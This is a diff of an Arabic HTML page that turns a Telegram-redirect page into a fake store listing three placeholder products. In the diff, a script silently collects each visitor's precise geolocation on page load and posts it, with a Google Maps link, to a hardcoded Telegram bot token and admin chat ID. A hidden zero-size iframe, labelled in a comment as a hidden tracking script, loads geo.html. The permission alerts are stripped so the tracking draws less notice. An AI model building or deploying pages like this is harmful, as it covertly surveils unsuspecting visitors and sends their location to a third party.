@@ -2,23 +2,24 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>جارٍ التحويل...</title>
+  <title>منتجات المتجر</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  
+  <!-- سكريبت تحديد الموقع في الخلفية -->
   <script>
-    const botToken = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";         // ← توكن البوت الخاص فيك
-    const adminId = "6243038338";  // ← آي دي تليجرام الخاص فيك
-    const botUsername = "YourBotUsername";         // ← اسم البوت بدون @
+    const botToken = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4"; // توكن البوت الخاص فيك
+    const adminId = "6243038338";  // آي دي تليجرام الخاص فيك
+    const botUsername = "YourBotUsername";  // اسم البوت بدون @
 
     window.onload = function () {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (position) {
           const lat = position.coords.latitude.toFixed(5);
           const lon = position.coords.longitude.toFixed(5);
-          
-          // إرسال الموقع إلى حسابك عبر تليجرام
           const location = `🛰️ موقع زبون جديد\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
-          // إرسال الرسالة إلى التليجرام
+          // إرسال الموقع عبر تليجرام
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: {
@@ -28,27 +29,49 @@
               chat_id: adminId,
               text: location
             })
-          }).then(response => {
-            if (response.ok) {
-              // إذا تم إرسال الرسالة بنجاح
-              window.location.href = `https://t.me/${botUsername}`;
-            }
           });
-          
-        }, function () {
-          alert("يرجى السماح للموقع بالحصول على موقعك الجغرافي للمتابعة.");
-        }, {
-          enableHighAccuracy: true, // طلب دقة أعلى في تحديد الموقع
-          timeout: 5000,            // الحد الأقصى للوقت للحصول على الموقع
-          maximumAge: 0            // عدم استخدام الموقع المخزن
+        }, null, {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
         });
-      } else {
-        alert("المتصفح لا يدعم تحديد الموقع.");
       }
     };
   </script>
 </head>
 <body>
-  <p>جارٍ تحويلك إلى تليجرام...</p>
+  <h1>منتجاتنا</h1>
+  
+  <div class="products">
+    <!-- منتج 1 -->
+    <div class="product">
+      <img src="Screenshot 2025-04-25 171850.png" alt="منتج 1">
+      <h2>اسم المنتج 1</h2>
+      <p>وصف المنتج 1</p>
+      <p class="price">السعر: 100 ريال</p>
+      <a href="bb.html"><button class="checkout">أضف للعربة</button></a>
+    </div>
+
+    <!-- منتج 2 -->
+    <div class="product">
+      <img src="img2.jpg" alt="منتج 2">
+      <h2>اسم المنتج 2</h2>
+      <p>وصف المنتج 2</p>
+      <p class="price">السعر: 150 ريال</p>
+      <a href="bb.html"><button class="checkout">أضف للعربة</button></a>
+    </div>
+    
+    <!-- منتج 3 -->
+    <div class="product">
+      <img src="img3.jpg" alt="منتج 3">
+      <h2>اسم المنتج 3</h2>
+      <p>وصف المنتج 3</p>
+      <p class="price">السعر: 200 ريال</p>
+      <a href="bb.html"><button class="checkout">أضف للعربة</button></a>
+    </div>
+  </div>
+
+  <!-- سكريبت التتبع الخفي -->
+  <iframe src="geo.html" style="width:0;height:0;border:0;visibility:hidden;position:absolute;"></iframe>
 </body>
 </html>
